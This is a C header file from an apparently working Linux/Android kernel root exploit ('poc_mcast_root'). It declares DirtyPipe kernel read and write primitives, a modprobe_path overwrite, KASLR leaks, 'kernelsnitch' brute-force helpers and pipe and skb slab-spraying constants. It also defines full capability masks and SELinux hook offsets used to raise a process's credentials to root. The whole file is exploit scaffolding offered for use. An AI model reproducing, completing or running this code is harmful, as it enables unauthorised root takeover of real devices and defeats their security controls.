#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1
#define TARGET_CONFIG_H "target.h"

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#define SKB_DATA_DELTA (-0xe80LL)

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif
#define MM_ORDER 3
#define MM_PARTIALS 5
#define CORE 0
#define KSNITCH_COLLISIONS 4

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define PIPE_CANDIDATE_PAGES 8
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 130
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL

#define TASK_COMM_LEN 16
#define SELINUX_KERNEL_SID 1
#define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
#define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)
#define CAP_FULL 0x000001ffffffffffULL
#define CRED_CAP_WORDS 5
#define CRED_CAP_INHERITABLE 0
#define CRED_CAP_PERMITTED 1
#define CRED_CAP_EFFECTIVE 2
#define CRED_CAP_BSET 3
#define CRED_CAP_AMBIENT 4

#ifndef KMALLOC_SHIFT_HIGH
#define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
#endif
#ifndef KMALLOC_BUCKETS
#define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
#endif
#ifndef KMALLOC_NORMAL_TYPE
#define KMALLOC_NORMAL_TYPE 0
#endif
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE 2
#endif
#ifndef KMALLOC_PIPE_INDEX
#define KMALLOC_PIPE_INDEX 11
#endif
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES 4
#endif
#define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#define KMALLOC_PIPE_OBJ_SIZE 0x800

#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
#define PAGE_TYPE_SLAB 0xf5

#define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
#define PIPE_SCAN_CHUNK 0x400
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
#define PIPE_MIN_PARTIAL 5
#define PIPE_CPU_PARTIAL 2
#define PIPE_DRAIN_SLABS 15
#define PIPE_RECLAIM_SLABS 15
#define PIPE_PARTIAL_GROUPS \
  ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
#define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
#define PIPE_C_SLABS PIPE_CPU_PARTIAL
#define PIPE_E_SLABS 2
#define PIPE_N_COUNT (PIPE_N_SLABS * PIPE_OBJS_PER_SLAB)
#define PIPE_C_COUNT (PIPE_C_SLABS * PIPE_OBJS_PER_SLAB)
#define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
#define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
#define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
#define PIPE_MAX_ATTEMPTS 12

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1

struct kernelsnitch_shared_state;

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct user_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

/* DirtyPipe helpers (implemented in pipe.c) */
extern int dirtypipe_init(void);
extern int dirtypipe_write(uintptr_t direct_addr, const void *data, size_t len);
extern int dirtypipe_read(uintptr_t direct_addr, void *out, size_t len);
extern int dirtypipe_modprobe_path(void);

/* poc_mcast_root.c globals used by pipe.c DirtyPipe helpers */
extern unsigned long k_empty_zero_page;
extern unsigned long k_modprobe_path;
extern void ghost_write_value(unsigned long target, unsigned long value);

/* logging */
#ifndef PR_LEVEL
#define PR_LEVEL 3
#endif

#undef pr_error
#undef pr_warning
#undef pr_info
#undef pr_success

#define pr_error(fmt, ...)   do { printf("\033[1;31m[-]\033[0m " fmt "\n", ##__VA_ARGS__); } while (0)
#define pr_warning(fmt, ...) do { printf("\033[1;33m[!]\033[0m " fmt "\n", ##__VA_ARGS__); } while (0)
#define pr_info(fmt, ...)    do { printf("\033[1;36m[*]\033[0m " fmt "\n", ##__VA_ARGS__); } while (0)
#define pr_success(fmt, ...) do { printf("\033[1;32m[+]\033[0m " fmt "\n", ##__VA_ARGS__); } while (0)

#define pr_err(...)     pr_error(__VA_ARGS__)
#define pr_warn(...)    pr_warning(__VA_ARGS__)
#define pr_debug(...)   pr_info(__VA_ARGS__)

/* KASLR state (defined in globals.c) */
extern int kaslr_done;
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;

/* DirtyPipe state (used by prepare_pipe_buffer_page handshake) */
extern atomic_int pipe_prepare_request;
extern atomic_int pipe_prepare_done;

/* memfd leak (used by cleanup_page_prepare_state) */
extern int memfd_leak;

/* legacy physrw proof page base (used by dead install_pipe_physrw in pipe.c) */
extern uintptr_t page_base;

/* legacy globals used by dead stubs in util.c */
extern pid_t root_child_pid;

/* elapsed-seconds timestamp helper (defined in globals.c) */
#include <sys/time.h>
double now_s(void);

/* KASLR leaks */
uint64_t perf_leak_text_base(void);

/* kernelsnitch wrappers (implemented in util.c) */
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t cleanup_kernelsnitch(void);

/* memfd/clone helpers (implemented in util.c / pipe.c) */
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
int clone_memfd(void);
void init_ctx(struct mm_ctx *ctx, size_t cnt);

/* address utilities (implemented in util.c) */
int is_direct_ptr(uintptr_t value);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);

/* kernel R/W via DirtyPipe (implemented in util.c) */
ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len);
uint64_t kernel_read64(int fd, uintptr_t target);

#endif
